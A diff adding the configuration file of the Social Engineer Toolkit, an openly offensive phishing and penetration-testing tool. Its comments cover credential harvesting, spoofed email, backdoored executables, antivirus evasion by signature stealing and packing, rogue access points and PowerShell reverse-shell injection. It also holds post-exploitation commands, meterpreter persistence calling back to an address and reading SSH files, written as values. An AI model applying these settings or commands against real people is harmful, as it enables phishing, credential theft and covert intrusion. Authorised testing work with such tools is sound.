@@ -1,0 +1,260 @@
+##################################################################################################
+##################################################################################################
+##												##
+## The following config file will allow you to customize settings within			##
+## the Social Engineer Toolkit. The lines that do not have comment code				##
+## ("#") are the fields you want to toy with. They are pretty easy to				##
+## understand.											##
+##												##
+## The Metasploit path is the default path for where Metasploit is located.			##
+## Metasploit is required for SET to function properly.						##
+##												##
+## The ETTERCAP function specifies if you want to use ARP Cache poisoning in			##
+## conjunction with the web attacks, note that ARP Cache poisoning is only			##
+## for internal subnets only and does not work against people on the internet.			##
+##												##
+## The SENDMAIL option allows you to spoof source IP addresses utilizing an			##
+## application called SendMail. Sendmail is NOT installed by default on BackTrack5.		##
+## To spoof email addresses when performing the mass email attacks, you must 			## 
+## install Sendmail manually using: apt-get install sendmail					##
+##												##
+## Note that ETTERCAP and SENDMAIL flags only accept ON or OFF switches.			##
+##												##
+## Note that the Metasploit_PATH cannot have a / after the folder name.				##
+##												##
+## There are additional options, read the comments for additional descriptions.		        ##
+##											        ##
+##################################################################################################
+##################################################################################################
+#
+### Define the path to MetaSploit, for example: /pentest/exploits/framework3 
+METASPLOIT_PATH=/opt/metasploit/msf3
+#
+### This will tell what database to use when using the MetaSploit functionality. Default is PostgreSQL
+METASPLOIT_DATABASE=postgresql
+#
+### How many times SET should encode a payload if you are using standard MetaSploit encoding options
+ENCOUNT=4
+#
+### If this options i set, the MetaSploit payloads will automatically migrate to
+### notepad once the applet is executed. This is beneficial if the victim closes
+### the browser, however can introduce buggy results when auto migrating.
+### NOTE: This will make bypassuac not work properly. Migrate to a different process to get it to work.
+AUTO_MIGRATE=OFF
+#
+### Custom exe you want to use for MetaSploit encoding, this usually has better av
+### detection. Currently it is set to legit.binary which is just calc.exe. An example
+### you could use would be putty.exe so this field would be /pathtoexe/putty.exe
+CUSTOM_EXE=legit.binary
+#
+### This is for the backdoored executable if you want to keep the executable to still work. Normally
+### when legit.binary is used, it will render the application useless. Specifying this will keep the
+### application working
+BACKDOOR_EXECUTION=ON
+#
+### Here we can run multiple meterpreter scripts once a session is active. This
+### may be important if we are sleeping and need to run persistence, try to elevate
+### permissions and other tasks in an automated fashion. First turn this trigger on
+### then configure the flags. Note that you need to separate the commands by a ; 
+METERPRETER_MULTI_SCRIPT=OFF
+LINUX_METERPRETER_MULTI_SCRIPT=OFF
+#
+### What commands do you want to run once a meterpreter session has been established.
+### Be sure if you want multiple commands to separate with a ;. For example you could do
+### run getsystem;run hashdump;run persistence to run three different commands
+METERPRETER_MULTI_COMMANDS=run persistence -r 192.168.1.5 -p 21 -i 300 -X -A;getsystem
+LINUX_METERPRETER_MULTI_COMMANDS=uname;id;cat ~/.ssh/known_hosts
+#
+### This is the port that is used for the iFrame injection using the metasploit browser attacks.
+### By default this port is 8080 however egress filtering may block this. May want to adjust to
+### something like 21 or 53
+METASPLOIT_IFRAME_PORT=8080
+#
+### Define to use Ettercap or not when using website attack only - set to ON and OFF
+ETTERCAP=OFF
+#
+### Ettercap home directory (needed for DNS_spoof)
+ETTERCAP_PATH=/usr/share/ettercap
+#
+### Specify what interface you want ettercap or DSNiff to listen on, if nothing will default
+ETTERCAP_INTERFACE=eth0
+#
+### Define to use dsniff or not when using website attack only - set to on and off
+### If dsniff is set to on, ettercap will automatically be disabled.
+DSNIFF=OFF
+#
+### Auto detection of IP address interface utilizing Google, set this ON if you want
+AUTO_DETECT=OFF
+#
+### SendMail ON or OFF for spoofing email addresses
+SENDMAIL=OFF
+#
+### Email provider list supports GMail, Hotmail, and Yahoo. Simply change it to the provider you want.
+EMAIL_PROVIDER=GMAIL
+#
+### Set to ON if you want to use Email in conjunction with webattack
+WEBATTACK_EMAIL=OFF
+#
+### Man Left In The Middle port, this will be used for the web server bind port
+MLITM_PORT=80
+#
+### Use Apache instead of the standard Python web server. This will increase the speed
+### of the attack vector.
+APACHE_SERVER=OFF
+#
+### Path to the Apache web root
+APACHE_DIRECTORY=/var/www
+#
+### Specify what port to run the http server off of that serves the java applet attack
+### or metasploit exploit. Default is port 80. This also goes if you are using apache_server equal on.
+### You need to specify what port Apache is listening on in order for this to work properly.
+WEB_PORT=80
+#
+### Create self-signed Java applets and spoof publisher note this requires you to
+### install --->  Java 6 JDK, BT5 or Ubuntu users: apt-get install openjdk-6-jdk
+### If this is not installed it will not work. Can also do: apt-get install sun-java6-jdk
+SELF_SIGNED_APPLET=OFF
+#
+### This flag will set the java id flag within the java applet to something different.
+### This could be to make it look more believable or for better obfuscation
+JAVA_ID_PARAM=Trusted Java Applet (VERIFIED SAFE)
+#
+### Java applet repeater option will continue to prompt the user with the java applet if
+### the user hits cancel. This means it will be non stop until run is executed. This gives
+### a better success rate for the Java applet attack
+JAVA_REPEATER=ON
+#
+### Java repeater timing which is the delay it takes between the user hitting cancel to
+### when the next Java applet runs. Be careful setting to low as it will spawn them over
+### and over even if they hit run. 200 equals 2 seconds.
+JAVA_TIME=200
+#
+### Turn on ssl certificates for set secure communications through web_attack vector
+WEBATTACK_SSL=OFF
+#
+### Path to the pem file to utilize certificates with the web attack vector (required)
+### You can create your own utilizing set, just turn on self_signed_cert
+### If your using this flag, ensure openssl is installed! To turn this on turn SELF_SIGNED_CERT
+### to the on position.
+SELF_SIGNED_CERT=OFF
+#
+### Below is the client/server (private) cert, this must be in pem format in order to work
+### Simply place the path you want. For example /root/ssl_client/server.pem
+PEM_CLIENT=/root/newcert.pem
+PEM_SERVER=/root/newreq.pem
+#
+### Tweak the web jacking time used for the iFrame replace, sometimes it can be a little slow
+### and harder to convince the victim. 5000 = 5 seconds
+WEBJACKING_TIME=2000
+#
+### Command center interface to bind to by default it is localhost only. If you want to enable it
+### so you can hit the command center remotely put the interface to 0.0.0.0 to bind to all interfaces.
+COMMAND_CENTER_INTERFACE=127.0.0.1
+#
+### Port for the command center
+COMMAND_CENTER_PORT=44444
+#
+### This will remove the set interactive shell from the menu selection. The SET payloads are large in nature
+### and things like the pwniexpress need smaller set builds
+SET_INTERACTIVE_SHELL=ON
+#
+### What do you want to use for your default terminal within the command center. The default is xterm
+### the options you have are as follow - gnome, konsole, xterm, solo. If you select solo it will place
+### all results in the same shell you used to open the set-web interface. This is useful if your using
+### something that only has one console, such as an iPhone or iPad.
+TERMINAL=SOLO
+#
+### Digital signature stealing method must have the pefile Python modules loaded
+### from http://code.google.com/p/pefile/. Be sure to install this before turning
+### this flag on!!! This flag gives much better AV detection
+DIGITAL_SIGNATURE_STEAL=ON
+#
+### These two options will turn the upx packer to on and automatically attempt
+### to pack the executable which may evade anti-virus a little better.
+UPX_ENCODE=ON
+UPX_PATH=/usr/bin/upx
+#
+### This feature will turn on or off the automatic redirection. By default for example in multi-attack
+### the site will redirect once one successful attack is used. Some people may want to use Java applet
+### and credential harvester for example.
+AUTO_REDIRECT=ON
+#
+### This will redirect the harvester victim to this website once executed and not to the original website.
+### For example if you clone abcompany.com and below it says blahblahcompany.com, it will redirect there instead.
+### THIS IS USEFUL IF YOU WANT TO REDIRECT THE VICTIM TO AN ADDITIONAL SITE AFTER HARVESTER HAS TAKEN THE CREDENTIALS.
+### SIMPLY TURN HARVESTER REDIRECT TO ON THEN ENTER HTTP://WEBSITEOFYOURCHOOSING.COM IN THE HARVESTER URL BELOW 
+### TO CHANGE.
+HARVESTER_REDIRECT=OFF
+HARVESTER_URL=http://thishasnotbeenset
+#
+### This feature will auto embed a img src tag to a unc path of your attack machine.
+### Useful if you want to intercept the half lm keys with rainbowtables. What will happen
+### is as soon as the victim clicks the web-page link, a unc path will be initiated
+### and the metasploit capture/smb module will intercept the hash values.
+UNC_EMBED=OFF
+#
+### This feature will attempt to turn create a rogue access point and redirect victims back to the
+### set web server when associated. airbase-ng and dnsspoof.
+ACCESS_POINT_SSID=linksys
+AIRBASE_NG_PATH=/usr/local/sbin/airbase-ng
+DNSSPOOF_PATH=/usr/local/sbin/dnsspoof
+#
+### This will configure the default channel that the wireless access point attack broadcasts on through wifi
+### communications.
+AP_CHANNEL=9
+#
+### This will enable the powershell shellcode injection technique with each java applet. It will be used as
+### a second form in case the first method fails.
+POWERSHELL_INJECTION=ON
+#
+### This will allow you to change the Metasploit payload to whatever you want based on the powershell alphanumeric
+### injection attack. Specify this if POWERSHELL INJECTION is set to ON and you want to change it from the standard
+### reverse_tcp attack. NOTE: payloads need to be specific to operating system i.e. x64 and x86
+POWERSHELL_INJECT_PAYLOAD_X64=windows/x64/meterpreter/reverse_tcp
+POWERSHELL_INJECT_PAYLOAD_X86=windows/meterpreter/reverse_tcp
+#
+### This will display the output of the powershell injection attack so you can see what is being placed on the
+### system.
+POWERSHELL_VERBOSE=OFF
+#
+### This will profile the victim machine and check for installed versions and report back on them
+### note this is currently disabled. Development is underway on this feature
+WEB_PROFILER=OFF
+#
+### Port numbers for the java applet attack linux/osx attacks, reverse payloads
+DEPLOY_OSX_LINUX_PAYLOADS=OFF
+OSX_REVERSE_PORT=8080
+LINUX_REVERSE_PORT=8081
+#
+### User agent string for when using anything that clones the website, this user agent will be used
+USER_AGENT_STRING=Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)
+#
+### The way the set interactive shell works is it first deploys a stager payload that pulls an additional executable.
+### The downloader is currently being picked up by a/v and is actually somewhat hard to obfuscate because it does 
+### similar characteristics of a download/exec. If you turn this feature on, set will download the interactive shell
+### straight without using the stager. Only issue with this is there may be a delay on the user end however still 
+### shouldn't be noticed
+SET_SHELL_STAGER=OFF
+#
+### Disables automatic listener - turn this off if you don't want a metasploit listener in the background.
+AUTOMATIC_LISTENER=ON
+#
+### This will disable the functionality if metasploit is not installed and you just want to use setoolkit or ratte for payloads
+### or the other attack vectors.
+METASPLOIT_MODE=ON
+#
+### THIS WILL TURN OFF DEPLOYMENT OF BINARIES FOR THE JAVA APPLET ATTACK AND ONLY USE THE POWERSHELL METHOD. 
+### NOTE THAT POWERSHELL_INJECTION MUST BE SET TO ON
+DEPLOY_BINARIES=YES
+#
+### THIS IS FOR DEBUG PURPOSES ONLY. THIS WILL REMOVE THE CLEANUP FUNCTIONALITY WITHIN SET TO DEBUG FILE STATES
+CLEANUP_ENABLED_DEBUG=OFF
+#
+### WHEN SENDING EMAILS OUT, SET WILL ADD A URL AND KEEP TRACK OF THE EMAIL ADDRESSES ON EACH UNIQUE LINK. THIS WILL HELP YOU FIND
+### WHO CLICKED ON THE LINK AND FROM WHAT PERSON / EMAIL ADDRESS WAS USED. THIS WORKS ON ALL WEB-BASED ATTACKS AND SPEAR-PHISHING.
+### 
+### NOTE: IN ORDER FOR THIS TO WORK YOU MUST ENABLE WEBATTACK_EMAIL and APACHE_SERVER TO ON.
+###
+TRACK_EMAIL_ADDRESSES=OFF
+#
+#######################################################################################################################################
